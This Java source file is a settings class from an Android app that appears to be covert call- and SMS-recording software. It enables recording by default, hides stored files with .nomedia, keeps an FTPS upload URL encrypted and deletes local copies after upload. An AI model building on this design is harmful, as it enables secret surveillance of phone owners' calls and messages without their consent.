package com.telephony.services;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.preference.PreferenceManager;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public final class PreferenceUtils {

    public static final String ROOT_DIR = "root_dir";
    public static final String VIBRATE = "vibrate";
    public static final String KEEP_DAYS = "keep_days";
    public static final String WIFI_ONLY = "wifi_only";
    public static final String UPLOAD_URL = "url";
    public static final String KEEP_UPLOADED = "keep_uploaded";
    public static final String CALLS_RECORD = "calls_record";
    public static final String SMS_RECORD = "sms_record";

    public static final String DEFAULT_ROOT_DIR = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Android"
            + File.separator + "data" + File.separator + "com.private.acr" + File.separator + "files";

    private static PreferenceUtils sInstance;
    private final SharedPreferences mPreferences;
    private final String key;

    private PreferenceUtils(final Context context) {
        mPreferences = PreferenceManager.getDefaultSharedPreferences(context);
        key = Utils.getDeviceId(context);
    }

    public static final PreferenceUtils getInstance(final Context context) {
        if (sInstance == null) {
            synchronized (PreferenceUtils.class) {
                if (sInstance == null) {
                    sInstance = new PreferenceUtils(context.getApplicationContext());
                }
            }
        }
        return sInstance;
    }

    /**
     * Получить корневую директрорию программы
     *
     * @return Корневая директория программы
     * @throws IOException
     */
    public File getRootDir() throws IOException {
        File root_dir = new File(DEFAULT_ROOT_DIR);
        try {
            if (mPreferences.contains(ROOT_DIR)) {
                root_dir = new File(Crypter.decrypt(mPreferences.getString(ROOT_DIR, ""), key));
            }
        } catch (Exception e) {
        } finally {
            File nomedia_file = new File(root_dir, ".nomedia");
            if (!nomedia_file.exists()) {
                if (!root_dir.exists()) {
                    root_dir.mkdirs();
                }
                nomedia_file.createNewFile();
            }
        }

        return root_dir;
    }

    /**
     * Получить количество милисекунд для вибрирования при ответе вызываемого абонента
     *
     * @return Количество милисекунд (<b>default</b> = 0)
     */
    public long getVibrate() {
        long DV = 0;
        try {
            return mPreferences.getLong(VIBRATE, DV);
        } catch (Exception e) {
            return DV;
        }
    }

    /**
     * Использовать ли для соединения только WIFI
     *
     * @return true - Интернет только через Wifi, иначе через любое возможное подключение (<b>default</b> = false)
     */
    public boolean isWifiOnly() {
        boolean DV = false;
        try {
            return mPreferences.getBoolean(WIFI_ONLY, DV);
        } catch (Exception e) {
            return DV;
        }
    }

    /**
     * Количество дней для хранения файлов
     *
     * @return Количество дней (<b>default</b> = 60)
     */
    public int getKeepDays() {
        int DV = 60;
        try {
            return mPreferences.getInt(KEEP_DAYS, DV);
        } catch (Exception e) {
            return DV;
        }
    }

    /**
     * Ссылка на FTPS сервер. Храниться в зашифрованном виде.
     *
     * @return Расшифрованная ссылка на FTPS сервер или исключение (<b>default</b> = исключение)
     */
    public String getRemoteUrl() {
        String res = "";
        try {
            res = Crypter.decrypt(mPreferences.getString(UPLOAD_URL, ""), key);
        } catch (Exception e) {
        }
        return res;
    }

    /**
     * Хранить ли файлы после загрузки на сервер.
     *
     * @return true - хранить, иначе нет. (<b>default</b> = false)
     */
    public boolean isKeepUploaded() {
        boolean DV = false;
        try {
            return mPreferences.getBoolean(KEEP_UPLOADED, DV);
        } catch (Exception e) {
            return DV;
        }
    }

    /**
     * Записывать или нет звонки
     *
     * @return true - записывать звонки, иначе нет (<b>default</b> = true)
     */
    public boolean isCallsRecord() {
        boolean DV = true;
        try {
            return mPreferences.getBoolean(CALLS_RECORD, DV);
        } catch (Exception e) {
            return DV;
        }
    }

    /**
     * Сохранять или нет sms
     *
     * @return true - сохранять sms, иначе нет (<b>default</b> = true)
     */
    public boolean isSMSRecord() {
        boolean DV = true;
        try {
            return mPreferences.getBoolean(SMS_RECORD, DV);
        } catch (Exception e) {
            return DV;
        }
    }

    /**
     * Установить корневую директорию программы. Храниться в зашифрованном виде.
     *
     * @param value Незашифрованный путь до корневой директории.
     * @throws InvalidKeyException
     * @throws IllegalBlockSizeException
     * @throws BadPaddingException
     * @throws UnsupportedEncodingException
     * @throws NoSuchAlgorithmException
     * @throws NoSuchPaddingException
     */
    public void setRootDir(final String value) throws InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
            UnsupportedEncodingException, NoSuchAlgorithmException, NoSuchPaddingException {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putString(ROOT_DIR, Crypter.encrypt(value, key));
            editor.apply();
        }
    }

    /**
     * Установить количество милисекунд вибрирования при ответе вызываемого абонента
     *
     * @param value Количество милисекунд
     */
    public void setVibrate(final Long value) {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putLong(VIBRATE, value);
            editor.apply();
        }
    }

    /**
     * Установить количество дней хранения файлов в корневой директории
     *
     * @param value Количество дней
     */
    public void setKeepDays(final Integer value) {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putInt(KEEP_DAYS, value);
            editor.apply();
        }
    }

    /**
     * Соединение с интернетом только через WIFI
     *
     * @param value true - только через Wifi, иначе через любое подключение
     */
    public void setWifiOnly(final Boolean value) {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putBoolean(WIFI_ONLY, value);
            editor.apply();
        }
    }

    /**
     * Установить сохранение файлов после загрузки на сервер
     *
     * @param value true - хранить, иначе нет.
     */
    public void setKeepUploaded(final Boolean value) {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putBoolean(KEEP_UPLOADED, value);
            editor.apply();
        }
    }

    /**
     * Установить запись звонков
     *
     * @param value true - записывать, иначе нет.
     */
    public void setCallsRecord(final Boolean value) {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putBoolean(CALLS_RECORD, value);
            editor.apply();
        }
    }

    /**
     * Установить запись sms
     *
     * @param value true - записывать, иначе нет.
     */
    public void setSMSRecord(final Boolean value) {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            editor.putBoolean(SMS_RECORD, value);
            editor.apply();
        }
    }

    /**
     * Установить ссылку до сервера. Храниться в зашифрованном виде.
     *
     * @param value Незашифрованная ссылка
     * @throws InvalidKeyException
     * @throws IllegalBlockSizeException
     * @throws BadPaddingException
     * @throws UnsupportedEncodingException
     * @throws NoSuchAlgorithmException
     * @throws NoSuchPaddingException
     */
    public void setRemoteUrl(final String value) throws InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
            UnsupportedEncodingException, NoSuchAlgorithmException, NoSuchPaddingException {
        if (value != null) {
            final SharedPreferences.Editor editor = mPreferences.edit();
            String crStr = Crypter.encrypt(value, key);
            editor.putString(UPLOAD_URL, crStr);
            editor.apply();
        }
    }

}
